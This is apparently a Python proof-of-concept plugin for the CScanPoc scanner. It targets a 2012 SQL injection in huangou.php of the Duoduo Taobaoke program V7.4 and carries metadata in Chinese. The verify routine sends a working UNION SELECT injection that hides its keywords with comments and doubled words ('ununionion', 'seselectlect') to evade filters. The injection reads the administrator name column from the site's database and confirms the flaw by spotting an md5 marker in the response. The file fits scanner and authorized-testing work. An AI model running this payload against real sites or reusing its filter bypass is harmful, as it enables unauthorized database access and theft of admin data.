# coding: utf-8
from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Duoduo_0001'  # 平台漏洞编号，留空
    name = '多多淘宝客程序 V7.4 SQL注射'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-05-06'  # 漏洞公布时间
    desc = '''
        多多淘宝客程序 V7.4 huangou.php ID过滤不严格导致注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/99/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '多多淘宝客'  # 漏洞应用名称
    product_version = 'V7.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '79207bae-9c0b-4476-9b35-a0350d0c712b'  # 平台 POC 编号，留空
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/huangou.php?id=1/**/and/**/1=2/**/ununionion/**/seselectlect/**/0,1,2,adminname,md5(c),5,6,7/**/from/**/duoduo_duoduo2010'
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
